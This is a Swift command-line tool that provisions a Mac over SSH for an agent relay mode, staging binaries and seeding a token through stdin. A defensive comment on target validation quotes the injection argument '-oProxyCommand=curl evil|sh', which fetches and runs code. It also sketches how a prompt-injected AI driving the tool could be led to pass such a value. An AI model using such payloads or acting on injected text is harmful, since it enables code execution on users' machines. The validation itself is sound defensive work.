import ConduitProvisioner
import Foundation

/// `eldrctl` — provision a Mac for Eldr "conduit" mode over SSH, and drive the pairing
/// handoff. A thin orchestrator around the checked-in `install-huginn.sh`
/// (`ConduitProvisioner.installScript`): it stages the payload with `scp`, runs the script
/// with `ssh`, and relays the node's pairing link. Secrets (the LLM token) are read from a
/// hidden tty and piped over SSH stdin — never argv/disk/history. No swift-argument-parser
/// (CLAUDE.md): a tiny `--key value` / flag parser, matching the other CLIs.
@main
struct EldrctlMain {
    static func main() async {
        let args = Array(CommandLine.arguments.dropFirst())
        guard let sub = args.first else { printUsage(); exit(2) }
        let rest = Array(args.dropFirst())
        do {
            switch sub {
            case "install": try runInstall(parseArgs(rest))
            case "conduit": try runConduit(rest)
            case "-h", "--help", "help": printUsage()
            case "--version": print("eldrctl/0.1.0")
            default:
                err("unknown command: \(sub)")
                printUsage()
                exit(2)
            }
        } catch let e as CLIError {
            err(e.message)
            exit(2)
        } catch {
            err("\(error)")
            exit(1)
        }
    }

    // MARK: - install

    static func runInstall(_ a: [String: String]) throws {
        guard let rawTarget = a["target"]?.nonEmpty else {
            throw CLIError("install needs --target <user@host>")
        }
        let target = try validatedTarget(rawTarget)
        let responder =
            ConduitProvisioner.Responder(rawValue: (a["responder"] ?? "sybilclaw")) ?? .sybilclaw
        // Install the GUI bundle by default; --no-app makes it headless-node-only.
        let installApp = a["no-app"] == nil
        let dryRun = a["dry-run"] != nil

        var config = ConduitProvisioner.Config(
            ownerHex: a["owner"] ?? "",
            relayURL: a["relay"] ?? "wss://relay.lerants.com",
            workdir: a["workdir"] ?? "",
            responder: responder,
            gatewayPort: Int(a["gateway-port"] ?? "") ?? 18789,
            llmURL: a["llm-url"] ?? "http://127.0.0.1:1234/v1",
            llmModel: a["llm-model"] ?? "local-model",
            installApp: installApp)
        try ConduitProvisioner(config: config).validate()

        // Resolve the payload on THIS (controller) machine.
        let fm = FileManager.default
        let appPath = a["app"] ?? "/Applications/Huginn.app"
        let nodePath = a["node"] ?? "\(appPath)/Contents/Resources/eldr-node"
        if installApp && !fm.fileExists(atPath: appPath) {
            throw CLIError("Huginn.app not found at \(appPath). Pass --app <path> or --no-app.")
        }
        guard fm.fileExists(atPath: nodePath) else {
            throw CLIError(
                "eldr-node binary not found at \(nodePath). Pass --node <path>, or build the "
                    + "DMG (Apps/Huginn/build-dmg.sh) so Huginn.app bundles it.")
        }

        // Stage the payload into a fresh remote temp dir.
        note("Staging payload on \(target) …")
        let stage = try sshCapture(target, "mktemp -d -t eldr-conduit")
            .trimmingCharacters(in: .whitespacesAndNewlines)
        guard !stage.isEmpty else { throw CLIError("could not create a staging dir on \(target).") }
        try scp(nodePath, "\(target):\(stage)/eldr-node", recursive: false)
        if installApp { try scp(appPath, "\(target):\(stage)/Huginn.app", recursive: true) }

        // Run the bootstrap over SSH, script on stdin, parameters as positional args.
        config.payloadDir = stage
        var scriptArgs = ConduitProvisioner(config: config).scriptArguments()
        if dryRun { scriptArgs.append("--dry-run") }
        note("Running install-huginn.sh on \(target) …")
        let remoteCmd = "bash -s -- " + scriptArgs.map(shellQuote).joined(separator: " ")
        try sshRun(target, remoteCmd, stdin: Data(ConduitProvisioner.installScript.utf8))

        // Clean up the staging dir (best effort).
        _ = try? sshCapture(target, "rm -rf " + shellQuote(stage))

        guard !dryRun else { note("Dry run complete (no system changes applied)."); return }

        // Hand back the pairing link.
        note("Pairing link (scan or paste into EldrChat ▸ new conversation):")
        let link = try sshCapture(
            target, "~/.local/bin/eldr-node --print-pairing-link --relay " + shellQuote(config.relayURL))
            .trimmingCharacters(in: .whitespacesAndNewlines)
        print(link)
        note("Next: seed the token →  eldrctl conduit import-token --target \(target)")
        note("Then on the phone, enable \"Drive this agent from here\" in the conversation details.")
    }

    // MARK: - conduit <subcommand>

    static func runConduit(_ rest: [String]) throws {
        guard let sub = rest.first else { throw CLIError("conduit needs a subcommand (instructions | pairing-link | import-token | status)") }
        let a = parseArgs(Array(rest.dropFirst()))
        switch sub {
        case "instructions":
            print(Runbook.text)
        case "pairing-link":
            let target = try requireTarget(a)
            let relay = a["relay"].map { " --relay " + shellQuote($0) } ?? ""
            let link = try sshCapture(target, "~/.local/bin/eldr-node --print-pairing-link" + relay)
                .trimmingCharacters(in: .whitespacesAndNewlines)
            print(link)
        case "import-token":
            let target = try requireTarget(a)
            let token = readSecret("LLM token (hidden): ")
            guard !token.isEmpty else { throw CLIError("no token entered; nothing imported.") }
            note("Piping token to \(target) (stdin only — never argv/disk) …")
            try sshRun(target, "~/.local/bin/eldr-node --import-token", stdin: Data(token.utf8))
        case "status":
            let target = try requireTarget(a)
            // Non-fatal: print whatever we can about the LaunchAgent + the node log tail.
            let uid = try sshCapture(target, "id -u").trimmingCharacters(in: .whitespacesAndNewlines)
            _ = try? sshRun(target, "launchctl print gui/\(uid)/chat.eldr.node 2>/dev/null | grep -E 'state|pid' || echo 'chat.eldr.node not loaded'")
            _ = try? sshRun(target, "tail -n 20 ~/.config/eldr-acp/eldr-node.log 2>/dev/null || echo '(no node log yet)'")
        default:
            throw CLIError("unknown conduit subcommand: \(sub)")
        }
    }

    static func requireTarget(_ a: [String: String]) throws -> String {
        guard let t = a["target"]?.nonEmpty else { throw CLIError("--target <user@host> is required.") }
        return try validatedTarget(t)
    }

    /// Validate a `[user@]host[:port]` destination before it is passed as a bare argv
    /// element to `ssh`/`scp`.
    ///
    /// `Process.arguments` bypasses the shell, so `;`/backtick injection is not the risk
    /// — argument injection is: OpenSSH parses argv with getopt and does NOT require
    /// options to precede the destination, so a `target` beginning with `-` (e.g.
    /// `-oProxyCommand=curl evil|sh`) is taken as a CLIENT OPTION and runs an arbitrary
    /// local program. `eldrctl` is documented as a tool an AI may drive, so a `--target`
    /// built from attacker-influenced text (a ticket/README read during a prompt-injected
    /// task) is a realistic local-code-execution path. Values embedded in the REMOTE
    /// command string are already `shellQuote`d; this closes the distinct local-invocation
    /// hole. Reject a leading `-` and whitelist the destination charset.
    static func validatedTarget(_ target: String) throws -> String {
        guard ConduitProvisioner.isSafeSSHDestination(target) else {
            throw CLIError(
                "--target must be a plain [user@]host[:port] and may not begin with '-' "
                    + "(got \(target)).")
        }
        return target
    }

    // MARK: - SSH / SCP plumbing

    /// Run a remote command, capturing stdout. stderr + our stdout inherit for progress.
    static func sshCapture(_ target: String, _ remoteCommand: String) throws -> String {
        try proc("/usr/bin/ssh", [target, remoteCommand], captureOut: true)
    }

    /// Run a remote command, inheriting stdout/stderr; optionally feed `stdin`.
    static func sshRun(_ target: String, _ remoteCommand: String, stdin: Data? = nil) throws {
        _ = try proc("/usr/bin/ssh", [target, remoteCommand], stdin: stdin, captureOut: false)
    }

    static func scp(_ local: String, _ remote: String, recursive: Bool) throws {
        var args: [String] = []
        if recursive { args.append("-r") }
        // `--` ends scp's option parsing so neither positional (a local path from
        // --node/--app, or the target-derived remote) can be read as an option even if
        // it begins with '-'. Modern OpenSSH scp supports this; the target itself is
        // already shape-validated in `validatedTarget`.
        args.append("--")
        args += [local, remote]
        _ = try proc("/usr/bin/scp", args, captureOut: false)
    }

    /// Run a child process. `stdin` is small (script ≤ a few KB, or a token), written before
    /// the (inherited or captured) output drains — no deadlock at these sizes.
    @discardableResult
    static func proc(_ launchPath: String, _ args: [String], stdin: Data? = nil, captureOut: Bool = false) throws -> String {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: launchPath)
        p.arguments = args
        let outPipe = Pipe()
        if captureOut { p.standardOutput = outPipe }
        var inPipe: Pipe?
        if stdin != nil {
            let ip = Pipe()
            inPipe = ip
            p.standardInput = ip
        }
        try p.run()
        if let stdin, let ip = inPipe {
            ip.fileHandleForWriting.write(stdin)
            try? ip.fileHandleForWriting.close()
        }
        var captured = ""
        if captureOut {
            let data = outPipe.fileHandleForReading.readDataToEndOfFile()
            captured = String(decoding: data, as: UTF8.self)
        }
        p.waitUntilExit()
        guard p.terminationStatus == 0 else {
            throw CLIError("`\(launchPath) \(args.joined(separator: " "))` exited \(p.terminationStatus).")
        }
        return captured
    }

    /// POSIX single-quote a value so it survives the remote shell intact.
    static func shellQuote(_ s: String) -> String {
        "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'"
    }

    /// Read a secret from the controlling terminal without echo (`getpass`). Returns "" if
    /// no tty / cancelled.
    static func readSecret(_ prompt: String) -> String {
        guard let c = getpass(prompt) else { return "" }
        return String(cString: c).trimmingCharacters(in: .whitespacesAndNewlines)
    }

    // MARK: - arg parsing + usage

    /// `--key value` pairs and bare `--flag` (→ "1"). Mirrors the other CLIs' tiny parser.
    static func parseArgs(_ args: [String]) -> [String: String] {
        var out: [String: String] = [:]
        var i = 0
        while i < args.count {
            let a = args[i]
            guard a.hasPrefix("--") else { i += 1; continue }
            let key = String(a.dropFirst(2))
            if i + 1 < args.count, !args[i + 1].hasPrefix("--") {
                out[key] = args[i + 1]
                i += 2
            } else {
                out[key] = "1"
                i += 1
            }
        }
        return out
    }

    static func note(_ s: String) { FileHandle.standardError.write(Data(("==> " + s + "\n").utf8)) }
    static func err(_ s: String) { FileHandle.standardError.write(Data(("eldrctl: " + s + "\n").utf8)) }

    static func printUsage() {
        print("""
        eldrctl — Eldr conduit installer

        USAGE
          eldrctl install --target <user@host> --owner <64-hex> [options]
          eldrctl conduit instructions
          eldrctl conduit pairing-link  --target <user@host> [--relay <wss>]
          eldrctl conduit import-token  --target <user@host>
          eldrctl conduit status        --target <user@host>

        install options
          --relay <wss://…>      relay both ends share (default wss://relay.lerants.com)
          --responder <name>     sybilclaw (default) | eldr-acp
          --workdir <path>       agent file-tool jail on the Mac (default: remote $HOME)
          --gateway-port <n>     sybilclaw gateway port (default 18789)
          --llm-url <url>        eldr-acp responder model URL
          --llm-model <name>     eldr-acp responder model name
          --app <Huginn.app>     app bundle to install (default /Applications/Huginn.app)
          --node <path>          eldr-node binary (default <app>/Contents/Resources/eldr-node)
          --no-app               headless node only (skip copying the GUI bundle)
          --dry-run              stage + run the script in --dry-run (no system changes)

        The LLM token is NEVER passed here; seed it with `conduit import-token`.
        """)
    }
}

struct CLIError: Error {
    let message: String
    init(_ message: String) { self.message = message }
}

extension String {
    var nonEmpty: String? {
        let t = trimmingCharacters(in: .whitespacesAndNewlines)
        return t.isEmpty ? nil : t
    }
}
